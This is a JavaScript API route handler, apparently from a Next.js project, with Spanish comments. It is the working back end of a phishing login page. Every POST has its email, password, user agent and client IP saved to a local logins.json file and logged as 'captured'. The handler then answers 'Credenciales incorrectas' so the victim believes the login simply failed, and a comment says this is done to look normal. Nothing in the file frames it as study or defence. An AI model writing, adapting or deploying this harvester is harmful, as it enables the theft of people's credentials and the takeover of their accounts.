export default function handler(req, res) {
  if (req.method === 'POST') {
    try {
      const { email, password, timestamp, userAgent } = req.body;
      
      // Obtener IP del cliente
      const ip = req.headers['x-forwarded-for'] || 
                 req.connection.remoteAddress || 
                 req.socket.remoteAddress ||
                 (req.connection.socket ? req.connection.socket.remoteAddress : null);
      
      // Guardar los datos en un archivo o base de datos
      const loginData = {
        email,
        password,
        timestamp,
        userAgent,
        ip,
        capturedAt: new Date().toISOString()
      };
      
      // Aquí puedes guardar los datos donde prefieras
      console.log('Datos de inicio de sesión capturados:', loginData);
      
      // Opción 1: Guardar en un archivo JSON
      const fs = require('fs');
      const path = require('path');
      
      const dataPath = path.join(process.cwd(), 'data', 'logins.json');
      
      // Crear la carpeta data si no existe
      if (!fs.existsSync(path.dirname(dataPath))) {
        fs.mkdirSync(path.dirname(dataPath));
      }
      
      // Leer datos existentes
      let loginsData = [];
      if (fs.existsSync(dataPath)) {
        const fileContent = fs.readFileSync(dataPath, 'utf8');
        loginsData = JSON.parse(fileContent);
      }
      
      // Añadir los nuevos datos
      loginsData.push(loginData);
      
      // Guardar los datos actualizados
      fs.writeFileSync(dataPath, JSON.stringify(loginsData, null, 2));
      
      // Responder como si todo fuera normal
      res.status(200).json({ 
        success: false, 
        message: 'Credenciales incorrectas' 
      });
    } catch (error) {
      console.error('Error al procesar login:', error);
      res.status(500).json({ 
        success: false, 
        message: 'Error del servidor' 
      });
    }
  } else {
    res.status(405).json({ error: 'Método no permitido' });
  }
}
